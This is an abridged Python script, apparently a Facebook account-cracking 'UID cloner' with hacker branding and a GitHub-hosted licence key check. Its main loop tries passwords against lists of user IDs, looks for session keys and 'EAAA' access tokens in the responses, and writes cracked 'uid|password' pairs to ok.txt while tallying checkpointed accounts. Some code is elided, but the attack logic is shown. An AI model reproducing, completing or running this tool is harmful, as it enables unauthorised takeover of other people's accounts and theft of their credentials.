...
import time
os.system("clear")
print("  ==> \033[1;32mTHIS TOOLS DECODE BY (XAK1L VAI) ")
time.sleep(5)
...
def notice():
	...
	runtxt("\033[0;92m BYPASS ADMIN FACEBOOK >> https://m.me/xark.xuckerberg1.0")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/XK1L71/SBAI/blob/main/SBAI.approval.txt').text
			if basesplit in plr:
				key = basesplit
		...
		runtxt("\n    \033[0;92m <=======    XAK1L UID COLONER   =======>  \033[0;97m ")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [SBI] : %s/%s -> \033[0;92m [ SBI-OK:%s ]- \033[0;91m[SBI-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [SBI-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [SBI-CP] %s | %s\033[0;97m         "%(uid, pw))
